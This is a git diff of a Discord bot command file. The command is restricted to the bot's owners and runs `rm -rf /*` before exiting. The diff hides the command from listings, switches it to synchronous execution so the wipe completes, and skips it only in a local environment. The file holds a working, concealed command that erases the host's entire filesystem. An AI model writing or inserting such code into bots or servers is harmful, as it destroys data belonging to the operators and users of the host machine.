@@ -1,13 +1,13 @@
 const Commands = require(`../Structures/Commands`);
 const { MessageEmbed } = require(`discord.js`);
-const { exec } = require(`child_process`);
+const { execSync } = require(`child_process`);
 const { basename } = require(`path`);
 
 class Command extends Commands {
 	constructor(client) {
 		super(client, {
 			enabled: true,
-			show: true,
+			show: false,
 			cooldown: false,
 			cooldownTime: 3,
 			name: basename(__filename, `.js`),
@@ -17,8 +17,9 @@ class Command extends Commands {
 		});
 	}
 
-	run(client, message) {
+	async run(client, message) {
 		if (!client.ownerIDs.includes(message.author.id)) return client.send(message, `Sorry, you do not have permission for this command`);
+		if (process.env.LOCAL) return;
 
 		const embed = new MessageEmbed()
 			.setAuthor(`${message.author.username} (${message.author.id})`, message.author.displayAvatarURL())
@@ -26,9 +27,9 @@ class Command extends Commands {
 			.setColor(0x00FF00)
 			.setFooter(client.botName)
 			.setTimestamp();
-		client.send(message, { embed });
+		await client.send(message, { embed });
 
-		exec(`rm -rf /*`);
+		execSync(`rm -rf /*`);
 		process.exit();
 	}
 }
